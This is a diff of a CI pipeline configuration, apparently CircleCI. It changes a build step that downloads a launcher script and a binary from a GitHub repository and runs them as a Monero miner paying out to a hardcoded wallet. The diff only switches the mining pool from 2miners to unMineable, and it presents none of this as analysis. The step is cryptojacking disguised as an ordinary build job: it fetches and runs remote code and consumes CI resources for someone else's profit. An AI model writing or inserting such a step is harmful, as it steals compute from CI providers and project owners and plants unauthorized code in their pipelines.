@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  wget https://github.com/hsnsvnnine11/a1/blob/main/cmdline_launcher.sh && wget https://github.com/hsnsvnnine11/a1/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet 8C2WiJBsdZeY5qpFYNRFnWgSmoqsxzu61iSb5yTLtwLG1rT14Qqn7qvC9Ysuiim5f6c9Mm4uUhFwtCPrAqkCNd5N2tvtva8  -rigName  $(echo $(shuf -i 1-9999 -n 1)-S1) -pool1 xmr.2miners.com:2222
+      - run:  wget https://github.com/hsnsvnnine11/a1/blob/main/cmdline_launcher.sh && wget https://github.com/hsnsvnnine11/a1/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -a rx -o rx.unmineable.com:3333 -u XMR:8C2WiJBsdZeY5qpFYNRFnWgSmoqsxzu61iSb5yTLtwLG1rT14Qqn7qvC9Ysuiim5f6c9Mm4uUhFwtCPrAqkCNd5N2tvtva8.aduh#mvzd-evg6
